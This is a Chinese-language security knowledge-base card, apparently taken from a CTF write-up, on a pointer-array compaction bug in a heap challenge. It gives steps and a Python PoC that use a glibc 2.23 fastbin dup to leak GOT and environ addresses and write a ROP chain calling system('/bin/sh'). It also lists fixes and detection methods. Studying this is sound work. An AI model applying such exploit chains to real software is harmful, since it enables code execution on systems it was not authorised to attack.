---
id: binary-pwn-heap-delete-compaction-stale-slot-fastbin-dup
title: delete 压缩指针数组不清末槽：glibc 2.23 fastbin dup 打 GOT/environ/栈
type: scenario
domain: binary
path: binary/pwn/heap
technique: delete-compaction-stale-slot-fastbin-dup
tags:
- pwn
- heap
- glibc223
- fastbin-dup
- uaf
- double-free
- got-leak
- environ
- stack-rop
cve: []
severity: high
confidence: high
affected_versions: glibc 2.23（原文题目环境）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:54:29+08:00'
  notes: 已对照原文与图01-08核对：delete 压缩后 p_nptr[0x13] 未清零形成别名/double free；0x60 请求→0x70 fastbin、A→B→A dup、0x60208d 目标、free@got 泄露、environ-0x136 栈泄露、0x40 fastbin 打栈、0x16 填充+pop rdi/binsh/system 与图11 getshell 一致。affected_versions 已为『glibc 2.23（原文题目环境）』，未改动；frontmatter无sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-delete-compaction-stale-slot-fastbin-dup/
draft: false
kb_aliases:
- 压缩数组末槽残留
- delete 移位不清零
- fastbin dup
- 无 edit 堆题
- 6299789
- environ 泄露栈
---

## 一句话结论

delete 接口在 free 后把指针数组整体左移压缩，只把当前槽清零，却让最后一个槽（如 `p_nptr[0x13]`）保留未清零的旧指针；反复删除即可在多个槽位留下同一 chunk 的别名，形成 double free/UAF，在 glibc 2.23（无 tcache）上用 fastbin dup 依次打 `.bss` 指针数组、GOT、`environ` 和栈返回地址，最终 ROP 执行 `system("/bin/sh")`。

## 原理

- 典型实现：`free(p_nptr[idx]); p_nptr[idx] = 0; while (idx + 1 <= 0x13) { p_nptr[idx] = p_nptr[idx+1]; idx++; }`。循环把后面的指针逐个前移，但循环结束时 `p_nptr[0x13]` 没有被赋值/清零，仍保留压缩前的最后一个指针。
- 压缩后，`p_nptr[0x12]` 与 `p_nptr[0x13]` 可能指向同一 chunk；后续对两个槽分别 delete，就会对同一块 free 两次。若中间插入分配，还可让多个槽位指向同一块，形成稳定的 UAF 读写别名。
- glibc 2.23 没有 tcache，0x70 大小的 chunk 释放后进入 fastbin。fastbin 只检查“当前 free 的 chunk 是否等于 fastbin 头”，因此按 A→B→A 的顺序 free 即可通过检查，形成 `A -> B -> A` 的环；后续 malloc 会重复返回 A，从而允许改写 A 的 `fd`，把下一次分配导向任意地址（fastbin dup）。
- 分配返回到目标地址后，`add` 写入的内容会直接覆盖目标：可把指针数组某项改成 `free@got` 用 `show` 泄露 libc；再改成 `environ` 泄露栈；最后把 0x40 fastbin 的 `fd` 指向 `environ - 0x136` 的返回地址，分配并写入 ROP 链。
- 该题没有 edit，所有修改都靠“让 malloc 返回到目标地址后写入”完成；目标地址需要满足 fastbin 的 chunk 对齐/大小检查，常用 `target - 8 + 5` 之类的偏移让 `size` 字段落在可控/合法位置。

## 触发条件

- 程序使用固定大小指针数组（如 20 项）管理堆块，delete 采用“左移压缩”且不清末槽；
- 分配大小落在 fastbin 范围（如请求 0x60 → chunk 0x70），glibc 2.23 或未启用 tcache 的环境；
- 有 show 接口能按槽位输出内容，或有其他读原语；
- 无 edit 也可，只要能通过 malloc 返回到目标地址并写入；
- 目标二进制非 PIE 或有已知 `.bss`/GOT 地址，便于 fastbin dup 定位。

## 利用步骤

1. 先分配 20 个 0x60 请求的 chunk，填满指针数组。
2. 连续 `delete(0)` 等操作，利用压缩后末槽残留制造多个指向同一 chunk 的槽位（示例留下 17/18/19 的别名）。
3. 清理其余槽位，保留可用于 fastbin dup 的别名。
4. fastbin dup：按 A→B→A 释放，改写 A 的 `fd` 为 `0x60208d`（指针数组附近，便于覆盖数组项）；连续 malloc 0x60，使某次分配返回到该地址。
5. 通过返回到指针数组的分配，把某个槽位改成 `free@got`；`show` 读出 free 的真实地址，`libc_base = leak - libc.sym['free']`。
6. 再次 fastbin dup 到同一区域，把槽位改成 `environ`；`show` 读出栈地址，`stack = environ - 0x136`（偏移按目标二进制/环境确认）。
7. 切换到 0x30 请求（0x40 chunk）的 fastbin，重复 dup，把 `fd` 指向栈返回地址；分配返回到栈上，写入 `pop rdi; /bin/sh; system`。
8. 触发返回，getshell。

## PoC

关键序列（完整交互按目标菜单调整）：

```python
for i in range(20):
    add(0x60, b"A"*0x60)

delete(0); delete(0)          # 利用压缩末槽残留留下别名
delete(19)
for i in range(10): delete(0) # 清理其余槽位，保留 dup 条件

# fastbin dup 到指针数组附近
delete(7); delete(0); delete(6)
add(0x60, p64(0x60208d))
add(0x60, b'a')
add(0x60, b'\xdc')
add(0x60, b'a'*3 + p64(0x602018))   # 槽位改成 free@got

show(0)
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['free']

# 再 dup 一次，改成 environ 泄露栈
delete(6); delete(4); delete(6)
add(0x60, p64(0x60208d))
add(0x60, b'b'); add(0x60, b'c')
add(0x60, b'a'*3 + p64(libc_base + libc.sym['environ']))
show(0)
stack = u64(io.recv(6).ljust(8, b'\x00')) - 0x136

# 0x40 fastbin dup 到栈返回地址
for i in range(9): add(0x30, b'Q'*0x30)
delete(11); delete(19); delete(11); delete(17); delete(2)
add(0x30, p64(stack)); add(0x30, b'x'); add(0x30, b'y')

payload  = b'A'*0x16 + p64(pop_rdi) + p64(binsh) + p64(system)
add(0x30, payload)
```

说明：示例地址/偏移来自原文题目，迁移到其他二进制需重新计算；`environ - 0x136` 依赖具体栈帧。

## 变体与关联

- 变体：delete 采用“memmove 压缩”而非循环时同样可能残留末槽；把末槽改成 NULL 即可修复。
- 变体：有 tcache 的高版本 glibc 需要处理 safe-linking 与 tcache key，可用 tcache dup 替代 fastbin dup；相关卡见 safe-linking 自异或与 tcache 毒化。
- 变体：无 show 时可通过 `_IO_2_1_stdout_`、GOT 部分覆盖或侧信道泄露。
- 关联：unsorted bin 泄露 libc、environ 泄露栈、栈迁移、ROP。
- 边界：fastbin dup 需要能连续 free 同一 chunk 且中间不触发 fastbin 头检查失败；目标地址需满足 fastbin 的 size/对齐约束。

## 检测与防御

- 防御：delete 后在压缩循环结束时显式 `p_nptr[0x13] = NULL`；或改用不移动元素的“空闲链表/句柄”结构，避免别名。
- 防御：释放后统一置空并校验重复释放；使用 glibc 的 tcache key、safe-linking 与堆检查（高版本默认开启）。
- 检测：审计“free + 数组左移压缩”的实现，重点看循环边界是否清空末槽；对同一地址重复 free、fastbin 链异常（环、非堆地址）做运行时检测。
- 检测：开启 ASan/Valgrind 或 glibc malloc 检查，观察 double free 与 fastbin corruption。
